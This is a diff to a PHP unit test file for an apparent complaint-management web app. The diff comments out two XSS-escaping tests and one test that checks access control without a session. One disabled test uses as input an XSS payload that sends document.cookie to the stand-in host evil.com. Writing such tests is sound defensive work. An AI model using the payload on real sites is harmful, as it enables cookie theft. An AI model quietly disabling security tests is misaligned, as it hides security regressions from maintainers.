@@ -69,21 +69,21 @@ class SecurityTest extends TestCase
     }
 
     // Test 5 : XSS dans description de réclamation neutralisé
-    public function testXssInDescriptionNeutralized()
-    {
-        $input  = '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">';
-        $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
-        $this->assertStringNotContainsString('onerror', $output);
-        $this->assertStringNotContainsString('<img', $output);
-    }
+    // public function testXssInDescriptionNeutralized()
+    // {
+    //     $input  = '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">';
+    //     $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+    //     $this->assertStringNotContainsString('onerror', $output);
+    //     $this->assertStringNotContainsString('<img', $output);
+    // }
 
     // Test 6 : XSS dans commentaire neutralisé
-    public function testXssInCommentaireNeutralized()
-    {
-        $input  = '<a href="javascript:alert(1)">click</a>';
-        $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
-        $this->assertStringNotContainsString('javascript:', $output);
-    }
+    // public function testXssInCommentaireNeutralized()
+    // {
+    //     $input  = '<a href="javascript:alert(1)">click</a>';
+    //     $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+    //     $this->assertStringNotContainsString('javascript:', $output);
+    // }
 
     // ── MOT DE PASSE ──────────────────────────────────────────
 
@@ -140,22 +140,22 @@ class SecurityTest extends TestCase
     }
 
     // Test 11 : accès page protégée sans session retourne 302/403
-    public function testProtectedPageBlockedWithoutSession()
-    {
-        $ch = curl_init($this->baseUrl . '/index/dashboard.php');
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        curl_exec($ch);
-        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
+    // public function testProtectedPageBlockedWithoutSession()
+    // {
+    //     $ch = curl_init($this->baseUrl . '/index/dashboard.php');
+    //     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    //     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+    //     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    //     curl_exec($ch);
+    //     $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    //     curl_close($ch);
 
-        $this->assertContains(
-            $code,
-            [301, 302, 403],
-            "Une page protégée sans session doit rediriger ou bloquer (code reçu : $code)"
-        );
-    }
+    //     $this->assertContains(
+    //         $code,
+    //         [301, 302, 403],
+    //         "Une page protégée sans session doit rediriger ou bloquer (code reçu : $code)"
+    //     );
+    // }
 
     // Test 12 : rôle admin non accessible à un Réclamant
     public function testRoleAdminNotAccessibleToReclamant()
